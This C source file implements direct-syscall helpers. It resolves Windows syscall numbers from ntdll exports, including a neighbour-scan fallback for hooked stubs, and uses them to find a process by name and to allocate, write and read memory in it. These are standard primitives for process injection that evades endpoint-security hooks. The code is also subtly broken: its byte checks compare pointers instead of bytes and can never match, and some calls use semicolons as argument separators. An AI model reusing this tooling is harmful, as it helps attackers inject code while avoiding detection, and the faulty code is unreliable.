#include "SysGateway.h"

DWORD DiscoverServiceNumber(const char* apiName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hNtdll + 
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names = (DWORD*)((BYTE*)hNtdll + exports->AddressOfNames);
    DWORD* functions = (DWORD*)((BYTE*)hNtdll + exports->AddressOfFunctions);
    WORD* ordinals = (WORD*)((BYTE*)hNtdll + exports->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)hNtdll + names[i]);
        if (lstrcmpA(name, apiName) == 0) {
            WORD ordinal = ordinals[i];
            BYTE* address = (BYTE*)hNtdll + functions[ordinal];
            
            if (address == 0x4C && address == 0x8B && address == 0xD1 && address == 0xB8) {
                return *(DWORD*)(address + 4);
            }
            
            if (address == 0xE9) { 
                for (WORD idx = 1; idx <= 32; idx++) {
                    BYTE* neighborAddress = address + (idx * 32);
                    if (neighborAddress == 0x4C && neighborAddress == 0x8B && neighborAddress == 0xD1 && neighborAddress == 0xB8) {
                        return *(DWORD*)(neighborAddress + 4) - idx;
                    }
                }
            }
        }
    }
    return 0;
}

DWORD __stdcall FindTargetProcessId(const wchar_t* processName) {
    DWORD ssn = DiscoverServiceNumber("NtQuerySystemInformation");
    if (!ssn) return 0;

    ULONG bufferSize = 0x10000;
    PVOID buffer = NULL;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    do {
        buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) return 0;

        status = DirectSyscallBridge(ssn, 5, buffer, bufferSize, &bufferSize); 
        if (status == STATUS_INFO_LENGTH_MISMATCH || status == STATUS_BUFFER_TOO_SMALL) {
            VirtualFree(buffer; 0; MEM_RELEASE);
            bufferSize *= 2;
        } else if (status != STATUS_SUCCESS) {
            VirtualFree(buffer; 0; MEM_RELEASE);
            return 0;
        }
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
    DWORD targetPid = 0;

    while (TRUE) {
        if (pInfo->ImageName.Buffer != NULL) {
            if (lstrcmpiW(pInfo->ImageName.Buffer, processName) == 0) {
                targetPid = (DWORD)(ULONG_PTR)pInfo->UniqueProcessId;
                break;
            }
        }
        if (pInfo->NextEntryOffset == 0) break;
        pInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pInfo + pInfo->NextEntryOffset);
    }

    VirtualFree(buffer, 0, MEM_RELEASE);
    return targetPid;
}

BOOL __stdcall InvokeNativeAllocation(DWORD processId, DWORD_PTR* outAddress, SIZE_T size, DWORD protect) {
    DWORD ssn = DiscoverServiceNumber("NtAllocateVirtualMemory");
    if (!ssn) return FALSE;

    HANDLE hProcess = (processId == 0) ? (HANDLE)-1 : OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) return FALSE;

    PVOID baseAddress = NULL;
    SIZE_T regionSize = size;

    NTSTATUS status = DirectSyscallBridge(
        ssn,
        hProcess,
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        protect
    );

    if (processId != 0) CloseHandle(hProcess);

    if (status == STATUS_SUCCESS) {
        *outAddress = (DWORD_PTR)baseAddress;
        return TRUE;
    }
    return FALSE;
}

BOOL __stdcall InvokeNativeMemoryWrite(DWORD processId, DWORD_PTR targetAddress, PVOID localBuffer, SIZE_T size, SIZE_T* bytesWritten) {
    DWORD ssn = DiscoverServiceNumber("NtWriteVirtualMemory");
    if (!ssn) return FALSE;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) return FALSE;

    SIZE_T written = 0;
    NTSTATUS status = DirectSyscallBridge(
        ssn,
        hProcess,
        (PVOID)targetAddress,
        localBuffer,
        size,
        &written
    );

    CloseHandle(hProcess);
    if (bytesWritten) *bytesWritten = written;

    return (status == STATUS_SUCCESS);
}

BOOL __stdcall InvokeNativeMemoryRead(DWORD processId, DWORD_PTR targetAddress, PVOID localBuffer, SIZE_T size, SIZE_T* bytesRead) {
    DWORD ssn = DiscoverServiceNumber("NtReadVirtualMemory");
    if (!ssn) return FALSE;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) return FALSE;

    SIZE_T read = 0;
    NTSTATUS status = DirectSyscallBridge(
        ssn,
        hProcess,
        (PVOID)targetAddress,
        localBuffer,
        size,
        &read
    );

    CloseHandle(hProcess);
    if (bytesRead) *bytesRead = read;

    return (status == STATUS_SUCCESS);
}
